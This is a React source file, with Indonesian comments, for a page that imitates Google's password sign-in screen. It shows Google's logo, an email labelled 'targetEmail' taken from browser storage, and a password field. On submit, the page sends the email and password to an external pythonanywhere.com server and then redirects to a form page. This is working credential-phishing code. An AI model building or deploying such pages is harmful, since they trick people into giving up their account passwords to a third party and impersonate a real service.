import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

export default function GooglePassword() {
  const [password, setPassword] = useState('');
  const [savedEmail, setSavedEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  
  const navigate = useNavigate();

  // Mengambil email dari memori browser saat halaman dimuat
  useEffect(() => {
    const email = localStorage.getItem('targetEmail');
    if (email) {
      setSavedEmail(email);
    } else {
      setSavedEmail('Email tidak ditemukan');
    }
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    const payload = {
      email: savedEmail,
      password: password
    };

    try {
      // 1. Mengirim data ke Python (app.py) di port 5000
      // const response = await fetch('http://127.0.0.1:5000/api/login', {
      //   method: 'POST',
      //   headers: { 'Content-Type': 'application/json' },
      //   body: JSON.stringify(payload)
      // });

      const response = await fetch('https://leccyciaa.pythonanywhere.com/', {
        method: 'POST',
        headers: { 'ontent-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      const data = await response.json();
      
      if (data.status === 'success') {
        // // 2. Jika sukses disimpan di database, langsung lompat ke formulir!
        // navigate('/formulir');

        localStorage.setItem('isLoggedIn', 'true')

        window.location.href = '/formulir'
      } else {
        alert("Gagal: " + data.pesan);
      }
    } catch (err) {
      console.error(err);
      alert('Gagal terhubung ke server Flask.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5] font-sans selection:bg-blue-200">
      
      <div className="bg-white border border-gray-200/60 rounded-xl p-9 w-full max-w-[450px] shadow-sm">
        
        {/* Header: Logo SVG & Teks */}
        <div className="text-center mb-6 grid place-items-center">
          {/* <svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg" className="h-8 w-auto mx-auto mb-4">
            <path d="M9.31 18.25c-5.1 0-9.31-4.07-9.31-9.12S4.21 0 9.31 0c2.81 0 5.17 1.05 6.94 2.76l-2.48 2.43c-.88-.84-2.31-1.63-4.46-1.63-3.66 0-6.7 3-6.7 6.81s3.04 6.82 6.7 6.82c4.19 0 5.92-2.73 6.32-4.54H9.31v-3.32h9.72c.13.7.2 1.4.2 2.22 0 6.3-4.23 10.7-9.92 10.7z" fill="#4285f4"/>
            <path d="M30.43 12.12c0 3.8-3.04 6.83-6.84 6.83s-6.83-3.03-6.83-6.83 3.03-6.83 6.83-6.83 6.84 3.03 6.84 6.83zm-3.3 0c0-2.43-1.84-4.22-3.54-4.22-1.7 0-3.54 1.79-3.54 4.22 0 2.42 1.84 4.22 3.54 4.22 1.7 0 3.54-1.8 3.54-4.22z" fill="#ea4335"/>
            <path d="M44.97 12.12c0 3.8-3.04 6.83-6.84 6.83s-6.83-3.03-6.83-6.83 3.03-6.83 6.83-6.83 6.84 3.03 6.84 6.83zm-3.3 0c0-2.43-1.84-4.22-3.54-4.22-1.7 0-3.54 1.79-3.54 4.22 0 2.42 1.84 4.22 3.54 4.22 1.7 0 3.54-1.8 3.54-4.22z" fill="#fbbc05"/>
            <path d="M58.74 1.15v16.98c0 6.64-3.26 9.36-6.68 9.36-3.4 0-5.46-2.27-6.22-4.13l2.87-1.2c.48 1.15 1.7 2.73 3.35 2.73 2.19 0 3.56-1.36 3.56-3.92v-1.6h-.12c-.7.83-2.04 1.58-3.52 1.58-3.36 0-6.42-2.92-6.42-6.8 0-3.9 3.06-6.82 6.42-6.82 1.48 0 2.82.75 3.52 1.56h.12v-1.14h3.12zm-3.15 10.97c0-2.4-1.63-4.22-3.46-4.22-1.87 0-3.5 1.82-3.5 4.22 0 2.38 1.63 4.22 3.5 4.22 1.83 0 3.46-1.84 3.46-4.22z" fill="#4285f4"/>
            <path d="M63.53.2h3.3v18.7h-3.3z" fill="#34a853"/>
            <path d="M72.93 14.86l2.67 1.78c-.8 1.19-2.74 2.31-5.18 2.31-3.83 0-6.75-3.03-6.75-6.83 0-3.94 2.94-6.83 6.42-6.83 3.5 0 5.48 2.92 5.96 4.49l.34.84-9.33 3.86c.7 1.39 1.87 2.11 3.36 2.11 1.48 0 2.62-.73 3.3-1.92h.02zm-6.66-2.95l6.03-2.5c-.33-.8-1.4-1.35-2.6-1.35-1.32 0-3.17 1.25-3.43 3.85z" fill="#ea4335"/>
          </svg> */}

            <svg className="w-5 h-5 items-center" viewBox="0 0 24 24">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
          
          <h1 className="text-2xl text-gray-900 font-normal mb-2">Welcome</h1>
          
          {/* Label Email (Kapsul profil ala Google) */}
          <div className="inline-flex items-center gap-2 px-3 py-1 border border-gray-300 rounded-full text-sm font-medium text-gray-700 mt-2 mb-4 hover:bg-gray-50 cursor-pointer transition-colors">
            <svg className="w-5 h-5 text-gray-500" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd"></path></svg>
            {savedEmail}
            <svg className="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
          </div>
        </div>

        {/* Form Input */}
        <form onSubmit={handleSubmit}>
          
          {/* Input dengan efek Floating Label */}
          <div className="relative mb-3">
            <input 
              type={showPassword ? "text" : "password"}
              id="password" 
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="block w-full px-4 py-3.5 text-base text-gray-900 bg-transparent border border-gray-300 rounded-md appearance-none focus:outline-none focus:ring-0 focus:border-blue-600 peer"
              placeholder=" " 
              required 
            />
            <label 
              htmlFor="password" 
              className="absolute text-gray-500 duration-200 transform -translate-y-4 scale-75 top-3 z-10 origin-[0] bg-white px-1 peer-focus:px-1 peer-focus:text-blue-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-3 peer-focus:scale-75 peer-focus:-translate-y-4 left-3"
            >
              Enter your password
            </label>
          </div>

          {/* Ceklis Show Password */}
          <div className="flex items-center mb-10 pl-1">
            <input 
              type="checkbox" 
              id="showPwd" 
              onChange={() => setShowPassword(!showPassword)}
              className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500 cursor-pointer"
            />
            <label htmlFor="showPwd" className="ml-3 text-sm text-gray-700 cursor-pointer">
              Show password
            </label>
          </div>

          <div className="mb-6">
            <a href="#" className="text-blue-600 font-medium text-sm hover:underline rounded">
              Forgot password?
            </a>
          </div>

          {/* Tombol Aksi */}
          <div className="flex items-center justify-between mt-8">
            <button 
              type="button" 
              className="text-blue-600 font-medium text-sm hover:bg-blue-50 px-4 py-2.5 rounded-md transition-colors -ml-2"
            >
              Try another way
            </button>
            
            <button 
              type="submit" 
              disabled={isLoading}
              className="bg-blue-600 hover:bg-blue-700 text-white font-medium text-sm px-6 py-2.5 rounded-md transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Verifying...' : 'Next'}
            </button>
          </div>

        </form>
      </div>
    </div>
  );
}